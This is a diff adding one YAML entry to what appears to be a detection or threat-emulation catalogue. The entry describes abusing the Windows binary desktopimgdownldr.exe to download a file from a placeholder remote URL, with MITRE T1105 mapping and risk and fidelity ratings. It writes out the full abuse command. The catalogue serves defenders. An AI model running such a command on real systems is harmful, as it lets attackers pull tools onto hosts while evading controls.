@@ -1,0 +1,19 @@
+- command: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr
+  description: Abuse desktopimgdownldr to download an arbitrary file from the given URL.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Desktopimgdownldr/
+  risk: High
+  risk_reason: Usage of desktopimgdownldr combined with remote domains should always be treated as a highly suspicious action.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is typically very abnormal for most organizations.
+  tool: DesktopImgDownldr
+  threatactors:
+    N/A:
+      - N/A
